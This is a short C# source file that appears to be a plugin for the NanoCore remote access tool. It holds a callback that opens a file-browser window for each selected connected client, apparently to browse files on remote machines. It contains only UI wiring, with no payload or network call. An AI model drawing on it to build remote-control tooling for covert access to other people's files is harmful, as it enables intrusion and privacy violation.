using NanoCore;

namespace FileBrowserServer
{
    public sealed class ContextCallbacks
	{
		public static void HandleFileManagerClick(IClient[] clients, bool @checked)
		{
			if (clients.Length == 0)
			{
				return;
			}
			foreach (IClient client in clients)
			{
				ServerMain.FileManager = new BrowserForm(client);
				ServerMain.FileManager.Show();
			}
		}
	}
}